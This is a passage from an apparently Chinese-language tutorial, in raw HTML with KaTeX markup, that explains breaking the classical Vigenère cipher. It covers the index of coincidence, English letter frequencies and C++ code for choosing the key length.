display=\"block\"><semantics><mrow><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mn>25</mn></munderover><msub><mi>f</mi><mi>j</mi></msub><mo>⋅</mo><mo stretchy=\"false\">(</mo><msub><mi>f</mi><mi>j</mi></msub><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow><mrow><msub><mi>l</mi><msub><mi>y</mi><mi>i</mi></msub></msub><mo>⋅</mo><mo stretchy=\"false\">(</mo><msub><mi>l</mi><msub><mi>y</mi><mi>i</mi></msub></msub><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">\\frac{\\sum_{j=0}^{25}f_j\\cdot(f_j-1)}{l_{y_i}\\cdot(l_{y_i}-1)}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:2.751934em;vertical-align:-0.972108em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.779826em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.825818em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.954008em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.43581800000000004em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.972108em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">p_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是统计出来的英语书面语 26 个字母的出现频率。通过常量定义如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">double</span> FREQ[<span class=\"number\">26</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0.082</span>, <span class=\"number\">0.015</span>, <span class=\"number\">0.028</span>, <span class=\"number\">0.043</span>,</span><br><span class=\"line\">    <span class=\"number\">0.127</span>, <span class=\"number\">0.022</span>, <span class=\"number\">0.020</span>, <span class=\"number\">0.061</span>,</span><br><span class=\"line\">    <span class=\"number\">0.070</span>, <span class=\"number\">0.002</span>, <span class=\"number\">0.008</span>, <span class=\"number\">0.040</span>,</span><br><span class=\"line\">    <span class=\"number\">0.024</span>, <span class=\"number\">0.067</span>, <span class=\"number\">0.075</span>, <span class=\"number\">0.019</span>,</span><br><span class=\"line\">    <span class=\"number\">0.001</span>, <span class=\"number\">0.060</span>, <span class=\"number\">0.063</span>, <span class=\"number\">0.091</span>,</span><br><span class=\"line\">    <span class=\"number\">0.028</span>, <span class=\"number\">0.010</span>, <span class=\"number\">0.023</span>, <span class=\"number\">0.001</span>,</span><br><span class=\"line\">    <span class=\"number\">0.020</span>, <span class=\"number\">0.001</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>计算出来的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 将会和实际英语书面语的<mark>重合指数</mark>比较，重合指数的计算如下，假设大量样本得到的文本长度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi></mrow><annotation encoding=\"application/x-tex\">l</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span></span></span></span>，26 个字母各自的出现为频数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>f</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">f_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mn>25</mn></munderover><msub><mi>p</mi><mi>j</mi></msub><mo>⋅</mo><mo stretchy=\"false\">(</mo><msub><mi>p</mi><mi>j</mi></msub><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow><mrow><mi>l</mi><mo>⋅</mo><mo stretchy=\"false\">(</mo><mi>l</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mfrac><mo>≈</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mn>25</mn></munderover><msubsup><mi>p</mi><mi>j</mi><mn>2</mn></msubsup><mo>=</mo><mn>0.065</mn></mrow><annotation encoding=\"application/x-tex\">\\frac{\\sum_{j=0}^{25}p_j\\cdot(p_j-1)}{l\\cdot(l-1)}\\approx\\sum_{j=0}^{25}p_j^2=0.065\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:2.715826em;vertical-align:-0.936em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.779826em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.825818em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:-0.0000050000000000050004em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.954008em;\"><span style=\"top:-2.40029em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.43581800000000004em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.2148900000000005em;vertical-align:-1.4137769999999998em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8011130000000004em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4137769999999998em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span><span style=\"top:-3.1130000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.383108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">5</span></span></span></span></span></p>\n<p>认为越接近这个数值的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，那么对应的周期  <code>m</code>  越有可能是正确的密钥长度。</p>\n<p>同时这里假定密文和密钥的比例不小于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>50</mn><mo>:</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">50:1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>，所以根据密文长度可以筛选掉一些太长的备选周期，而且实际允许程序发现有一些错误的密钥长度下计算的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">M_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 比真正的密钥长度还接近 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0.065</mn></mrow><annotation encoding=\"application/x-tex\">0.065</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">5</span></span></span></span>，这一筛选可以提高破解准确率。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> m = c_l / <span class=\"number\">50</span>;</span><br><span class=\"line\"><span class=\"type\">double</span> idx_avg_best_diff = <span class=\"number\">1</span>;</span><br><span class=\"line\">vector&lt;string&gt; y_vec;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt; &gt; y_freq;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> candidate: candidates)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> factor = <span class=\"number\">2</span>; factor &lt;= candidate; ++factor) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (candidate % factor == <span class=\"number\">0</span> &amp;&amp; factor * <span class=\"number\">50</span> &lt; c_l) &#123;</span><br><span class=\"line\">            <span class=\"function\">vector&lt;string&gt; <span class=\"title\">y_vec_tmp</span><span class=\"params\">(factor)</span></span>;</span><br><span class=\"line\">            vector&lt;vector&lt;<span class=\"type\">int</span>&gt; &gt; <span class=\"built_in\">y_freq_tmp</span>(factor, <span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;(<span class=\"number\">26</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;c_l;++i)&#123;</span><br><span class=\"line\">                y_vec_tmp[i % factor].<span class=\"built_in\">push_back</span>(c[i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(c[i] - <span class=\"string\">&#x27;a&#x27;</span> &gt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                    y_freq_tmp[i % factor][c[i] - <span class=\"string\">&#x27;a&#x27;</span>] += <span class=\"number\">1</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    y_freq_tmp[i % factor][c[i] - <span class=\"string\">&#x27;A&#x27;</span>] += <span class=\"number\">1</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"type\">double</span> M_avg = <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;factor;++i)&#123;</span><br><span class=\"line\">                <span class=\"type\">double</span> M = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">26</span>;++j)&#123;</span><br><span class=\"line\">                    M += y_freq_tmp[i][j] * (y_freq_tmp[i][j] - <span class=\"number\">1</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                M /= y_vec_tmp[i].<span class=\"built_in\">length</span>() * (y_vec_tmp[i].<span class=\"built_in\">length</span>() - <span class=\"number\">1</span>);</span><br><span class=\"line\">                M_avg += M;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            M_avg /= factor;</span><br><span class=\"line\">            <span class=\"type\">double</span> idx_avg_diff = <span class=\"built_in\">abs</span>(M_avg - <span class=\"number\">0.065</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(idx_avg_diff &lt; idx_avg_best_diff)&#123;</span><br><span class=\"line\">                m = factor;</span><br><span class=\"line\">                idx_avg_best_diff = idx_avg_diff;</span><br><span class=\"line\">                y_vec = y_vec_tmp;</span><br><span class=\"line\">                y_freq = y_freq_tmp;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"确定密钥\"><a class=\"anchor\" href=\"#确定密钥\">#</a> 确定密钥</h2>\n<p>在确定了密钥长度  <code>m</code>  之后，维吉尼亚加密就被分解为了  <code>m</code>  个单表移位加密，所以接下来的步骤实际上就是进行  <code>m</code>  次单表移位破解， <code>m</code>  个单表加密密文就是依据周期  <code>m</code>  划分的密文段 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>⋯</mo><msub><mi>y</mi><mi>m</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_1,y_2,\\cdots y_m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span 